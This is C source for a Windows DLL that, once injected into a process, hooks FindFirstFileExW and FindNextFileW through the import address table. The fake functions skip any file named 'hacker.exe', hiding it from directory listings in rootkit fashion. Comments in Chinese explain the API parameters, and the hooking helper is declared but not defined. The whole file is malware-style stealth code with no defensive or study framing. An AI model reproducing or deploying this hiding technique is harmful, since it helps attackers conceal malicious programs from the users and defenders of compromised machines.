#include <windows.h>

#define FILENAME "hacker.exe"

LONG IATHook(
	__in_opt void* pImageBase,
	__in_opt const char* pszImportDllName,
	__in const char* pszRoutineName,
	__in void* pFakeRoutine,
	__out HANDLE* phHook
);

LONG UnIATHook(__in HANDLE hHook);

void* GetIATHookOrign(__in HANDLE hHook);

typedef HANDLE(__stdcall *LPFN_FindFirstFileExW)(
	LPCSTR             lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
	);
typedef BOOL(__stdcall *LPFN_FindNextFileW)(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
	);
HANDLE g_hHook_FindFirstFileExW = NULL;
HANDLE g_hHook_FindNextFileW = NULL;

/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

// lpFileName		目录或路径以及文件名
// fInfoLevelId	返回数据的信息级别
// lpFindFileData	指向接收文件数据的缓冲区的指针
// fSearchOp		要执行的过滤类型与通配符匹配不同
// lpSearchFilter	如果指定的fSearchOp需要结构化搜索信息，则指向搜索条件的指针
// dwAdditionalFlags	指定控制搜索的其他标志
HANDLE __stdcall Fake_FindFirstFileExW(
	LPCSTR             lpFileName,
	FINDEX_INFO_LEVELS fInfoLevelId,
	LPVOID             lpFindFileData,
	FINDEX_SEARCH_OPS  fSearchOp,
	LPVOID             lpSearchFilter,
	DWORD              dwAdditionalFlags
) {
	LPFN_FindFirstFileExW fnOrigin = (LPFN_FindFirstFileExW)GetIATHookOrign(g_hHook_FindFirstFileExW);
	HANDLE hFindFile = fnOrigin(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
	while (0 == wcscmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, TEXT(FILENAME))) {
		FindNextFileW(hFindFile, (LPWIN32_FIND_DATA)lpFindFileData);
	}
	return hFindFile;
}

// hFindFile	先前调用FindFirstFile或 FindFirstFileEx函数返回的搜索句柄
// lpFindFileData	指向WIN32_FIND_DATA结构的指针，该结构接收有关找到的文件或子目录的信息
BOOL __stdcall Fake_FindNextFileW(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
) {
	LPFN_FindNextFileW fnOrigin = (LPFN_FindNextFileW)GetIATHookOrign(g_hHook_FindNextFileW);
	BOOL rv = fnOrigin(hFindFile, lpFindFileData);
	if (0 == wcscmp(((WIN32_FIND_DATA*)lpFindFileData)->cFileName, TEXT(FILENAME))) {
		rv = fnOrigin(hFindFile, lpFindFileData);
	}
	return rv;
}

BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpvRevered) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		IATHook(
			GetModuleHandle(NULL),
			"kernel32.dll",
			"FindFirstFileExW",
			Fake_FindFirstFileExW,
			&g_hHook_FindFirstFileExW
		);
		IATHook(
			GetModuleHandle(NULL),
			"kernel32.dll",
			"FindNextFileW",
			Fake_FindNextFileW,
			&g_hHook_FindNextFileW
		);
		break;
	case DLL_PROCESS_DETACH:
		UnIATHook(g_hHook_FindFirstFileExW);
		UnIATHook(g_hHook_FindNextFileW);
		break;
	}
	return TRUE;
}